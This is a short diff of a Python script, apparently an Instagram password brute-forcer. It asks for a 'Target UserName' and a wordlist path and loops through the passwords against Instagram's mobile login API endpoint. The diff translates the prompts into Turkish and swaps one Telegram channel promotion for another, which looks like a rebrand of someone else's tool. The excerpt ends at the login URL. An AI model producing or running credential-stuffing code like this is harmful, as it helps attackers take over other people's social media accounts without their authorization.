@@ -1,3 +1,4 @@
+os.system("clear")
 import requests
 from uuid import uuid4
 uid = str(uuid4())
@@ -5,9 +6,9 @@ E = '\033[1;31m'
 G = '\033[1;32m'
 S = '\033[1;33m'
 Z = '\033[1;31m' 
-username=input(Z+'[♡] Target UserName ==> ')
-passlist=input(S+'[◇] PassWord List Path ==> ')
-print('======Join @Mr_Indian_Anon=========')
+username=input(Z+'[♡] Kullanıcı adı giriniz ==> ')
+passlist=input(S+'[◇] Wordlist giriniz ==> ')
+print('======Join @SenicMedya=========')
 for Whisper in open(passlist,'r').read().splitlines():
  password=str(Whisper.split('\n')[0])
  url = 'https://b.i.instagram.com/api/v1/accounts/login/'
